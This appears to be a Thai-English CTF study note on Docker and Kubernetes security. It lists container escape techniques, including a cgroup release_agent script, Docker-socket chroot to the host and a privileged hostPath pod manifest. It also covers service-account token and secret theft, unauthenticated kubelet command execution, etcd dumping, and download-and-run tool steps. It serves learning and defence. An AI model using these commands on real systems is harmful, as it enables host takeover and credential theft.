---
tags: [ctf, container, docker, kubernetes, k8s]
created: 2026-05-02
---

# 🐳 Container & Kubernetes Security

> Container CTF challenges เน้น: Docker escape, K8s misconfigurations, RBAC bypass, container metadata abuse

---

## 🐳 Docker Basics

### Detect ว่าอยู่ใน container
```bash
# Common indicators
ls /.dockerenv                                # Docker creates this
cat /proc/1/cgroup | grep -i docker           # cgroup mentions docker
cat /proc/self/cgroup                          # /docker/<id>
hostname                                       # short hex string?
ls /                                           # different layout?

# Detection script: amicontained
amicontained
```

### Detect specific runtime
- Docker: `/.dockerenv` exists
- LXC: `/proc/self/cgroup` mentions lxc
- Kubernetes pod: `KUBERNETES_*` env vars
- containerd
- podman

---

## 🚪 Docker Escape Techniques

### 1. Privileged container
ถ้า container run with `--privileged`:
```bash
# Inside container: check
capsh --print | grep cap_sys_admin

# If has cap_sys_admin → mount host
mkdir /mnt/host
mount /dev/sda1 /mnt/host       # find correct device
ls /mnt/host                    # host filesystem!

# Or via cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat output       # commands run as host root!
```

### 2. Docker socket exposed
ถ้า `/var/run/docker.sock` mounted ใน container:
```bash
# Container has Docker access: escape easily
docker run -v /:/host -it ubuntu chroot /host /bin/sh
# Now you're host root!

# Or curl directly
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

ที่เป็น "fundamental escape": Docker socket = root on host

### 3. Capabilities-based escape

#### CAP_SYS_ADMIN (privileged-ish)
- `mount`, etc. → escape via mounting

#### CAP_DAC_READ_SEARCH
- Bypass file read permission → exfil files

#### CAP_SYS_PTRACE
- ptrace host processes (if host PID space shared)

#### CAP_SYS_MODULE
- Load kernel module → root

### Tool: deepce
```bash
# Auto-check escape paths
curl https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
sh deepce.sh
```

### Tool: amicontained
```bash
amicontained                  # what container am I in
```

### Tool: linpeas (general)
```bash
# Has container-escape checks
./linpeas.sh
```

### 4. Mounted host paths
ถ้า host directory mounted:
```bash
# Look for mounted host paths
mount | grep "/host"
mount | grep -v overlay

# If /etc, /root, /var/run/docker.sock mounted → escape
```

### 5. Kernel exploits
ถ้า host kernel มี vuln (e.g. Dirty Pipe, Dirty COW):
- Container shares kernel with host
- Kernel exploit → escape

### 6. release_agent (cgroup v1)
หากมี cgroup v1 + cap_sys_admin → escape via `release_agent` (CVE-style technique)

---

## ☸️ Kubernetes Basics

### Identify K8s pod
```bash
# Inside pod
ls /var/run/secrets/kubernetes.io/serviceaccount/
# Files: ca.crt, namespace, token

env | grep KUBERNETES
# KUBERNETES_SERVICE_HOST=10.0.0.1
# KUBERNETES_SERVICE_PORT=443
```

### Get service account token
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://$KUBERNETES_SERVICE_HOST

curl -sk --header "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/$NAMESPACE/pods
```

→ ถ้าได้ pod list = token has permissions

---

## 🔓 K8s Privilege Escalation

### Check what your token can do
```bash
# Install kubectl in pod
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Use service account token
./kubectl auth can-i --list -n <namespace>
./kubectl get pods
./kubectl get secrets
```

### Common K8s misconfigs

#### 1. Listing secrets across namespaces
```bash
kubectl get secrets --all-namespaces
kubectl get secret <name> -o yaml -n <namespace>
# Decode base64 values
```

#### 2. RBAC misconfig: pod create
ถ้า service account สามารถ create pods → create privileged pod:
```yaml
# privesc-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
spec:
  containers:
  - image: alpine
    name: shell
    command: ["sh","-c","sleep 9999"]
    securityContext:
      privileged: true
    volumeMounts:
      - name: host
        mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

```bash
kubectl apply -f privesc-pod.yaml
kubectl exec -it priv-pod -- chroot /host /bin/sh
# Host root!
```

#### 3. Exec into pods
```bash
kubectl get pods --all-namespaces
kubectl exec -it <pod-name> -- /bin/sh
```

#### 4. Service Account abuse
- Some pods run with admin SA
- Find them, exec into → use their token

#### 5. Cluster-admin role binding
ถ้าได้สิทธิ์ create RoleBinding → bind your SA to cluster-admin

---

## 🛠 Tools

### kubectl-who-can
```bash
kubectl who-can create pods
kubectl who-can list secrets --all-namespaces
```

### kube-hunter
```bash
docker run -it --rm --network host aquasec/kube-hunter --remote 10.0.0.1
# Active scan
docker run -it --rm --network host aquasec/kube-hunter --remote 10.0.0.1 --active
```

### peirates (interactive)
```bash
# Inside pod
wget https://github.com/inguardians/peirates/releases/download/v.../peirates
chmod +x peirates
./peirates
# Interactive menu: try all attacks
```

### kubelet API (port 10250)
ถ้า kubelet API exposed:
```bash
curl -sk https://<node>:10250/pods
curl -sk https://<node>:10250/run/<ns>/<pod>/<container> -d "cmd=id"
# RCE without auth!
```

→ ดู scan: `nmap -p 10250,10255,10256 --script kubelet*`

### etcd directly
ถ้า etcd ไม่ secured (port 2379):
```bash
ETCDCTL_API=3 etcdctl --endpoints=https://<host>:2379 \
    --cacert=ca.crt --cert=client.crt --key=client.key \
    get / --prefix --keys-only
# All cluster data!
```

---

## 🎯 K8s Service Discovery from inside pod

```bash
# Other pods
kubectl get pods --all-namespaces

# Services (IPs to other apps)
kubectl get svc --all-namespaces

# Endpoints
kubectl get endpoints --all-namespaces

# ConfigMaps (often have non-secret config)
kubectl get configmaps --all-namespaces -o yaml

# All resources
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get --show-kind --ignore-not-found
```

---

## 🎯 CTF Patterns

### Pattern 1: Web RCE → container escape
1. Web app vulnerable to RCE → shell in container
2. `cat /.dockerenv` → confirm container
3. Check capabilities → if privileged → escape via cgroup or mount
4. Or check for mounted Docker socket
5. Escape → host filesystem → flag

### Pattern 2: K8s pod token abuse
1. RCE in pod
2. `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
3. Use kubectl with token
4. List secrets → find admin token / DB password → flag

### Pattern 3: Helm chart misconfig
- Helm release → ConfigMap with secret values
- List configmaps → find creds

### Pattern 4: Docker registry
- ถ้า private registry exposed
- `curl http://registry:5000/v2/_catalog` → list images
- Pull images → docker save → analyze layers (often have secrets)

### Pattern 5: Build-time secrets in image layers
```bash
# Get image layers
docker save image:tag -o image.tar
tar -xf image.tar
# Look at layer content
ls *.tar.gz
# Each layer has filesystem changes
```

→ Sometimes secrets in deleted files (layers don't actually delete)

---

## 🛡 Container security tools

### Trivy
```bash
trivy image <image>            # vulnerability scan
trivy fs /                     # local FS scan
```

### Grype, Clair, Anchore
- Image vulnerability scanning

### Falco
- Runtime security (detect bad container behavior)

### gVisor / Kata
- Sandboxed container runtime

---

## 🔥 Specific Real-World CVEs

- **CVE-2019-5736** runC escape: manipulating runc binary from host
- **CVE-2022-0847 Dirty Pipe**: kernel bug, container escape
- **CVE-2022-0185**: file system util kernel bug
- **CVE-2024-0193**: netfilter, container escape

ใน CTF อาจจำลอง CVEs เหล่านี้

---

## 🔗 ที่เกี่ยวข้อง

- [Cloud-Security](Cloud-Security.md)
- [SSRF → metadata](../03-Web-Exploitation/SSRF.md)
- [Kernel exploits](../06-Binary-Exploitation/Pwn-Intro.md)

## 📚 References

- HackTricks Cloud → Containers
- "Container Security": Liz Rice
- kubernetes.io/docs/concepts/security
- madhuakula/kubernetes-goat (intentionally vulnerable K8s)
- bustakube: K8s CTF labs

---

#ctf #container #docker #kubernetes
